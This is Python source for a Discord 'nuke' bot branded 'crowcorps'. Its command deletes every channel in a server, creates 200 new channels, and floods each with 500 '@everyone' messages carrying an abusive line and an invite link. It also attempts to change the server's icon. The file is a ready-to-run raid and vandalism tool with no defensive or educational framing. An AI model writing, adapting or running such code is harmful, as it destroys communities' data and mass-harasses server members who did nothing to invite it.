import discord
from discord.ext import commands
import random
import asyncio

intents = discord.Intents.default()
intents.guilds = True
intents.guild_messages = True
intents.message_content = True

bot = commands.Bot(command_prefix='c$', intents=intents)

print("bot is alive")

channel_names = ["♛-crowcorps-☾", "。crowcorps-injection-⛧", "。şŧ-⛧-§-♛-♘", "。ravaged-by-crowcorps-♛", "。⛧⸸-crow-purify-§⛧", "⛧⸸-♛-☾-⸸-☾-♛-⸸⛧"]

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="⸸ Annihilated by the CROW⛧"))

@bot.command(name='nuke')
async def create_and_delete_channels(ctx):
    for channel in ctx.guild.channels:
        try:
            await channel.delete()
        except Exception as e:
            print(f"Error deleting the channel {channel.name}: {e}")

    tasks = []

    for i in range(1, 201):
        channel_name = random.choice(channel_names)
        new_channel = await ctx.guild.create_text_channel(f'{channel_name}-{i}')
        task = asyncio.create_task(send_messages(new_channel, 500))
        tasks.append(task)

    await ctx.guild.edit(icon=discord.File("https://media.discordapp.net/attachments/1280305163353198632/1292163923503747122/maxresdefault-removebg-preview.png?ex=6702bcee&is=67016b6e&hm=9bf4f878282577f2103fecc8d7ddb7d00975f42d731307f626d08921640e95b6&=&format=webp&quality=lossless"))

    await ctx.send('deleted all')

async def send_messages(channel: discord.TextChannel, count: int):
    for _ in range(count):
        await channel.send('⸸ @everyone fucked by the CROW https://discord.gg/a3SZHCKfNG')

bot.run('Put Your Token Here')